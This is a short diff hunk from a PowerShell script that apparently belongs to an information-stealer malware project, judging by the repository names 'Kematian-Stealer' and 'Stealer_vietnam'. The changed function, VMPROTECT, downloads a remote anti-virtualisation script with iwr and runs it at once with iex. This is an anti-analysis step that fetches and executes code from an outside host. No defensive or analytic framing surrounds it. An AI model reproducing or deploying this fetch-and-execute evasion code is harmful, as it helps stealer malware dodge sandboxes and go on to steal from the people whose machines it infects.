@@ -99,7 +99,7 @@ function Invoke-TASKS {
 }
 
 function VMPROTECT {
-    $link = ("https://github.com/adasdasdsaf/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
+    $link = ("https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/antivm.ps1")
     iex (iwr -uri $link -useb)
     Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
 }
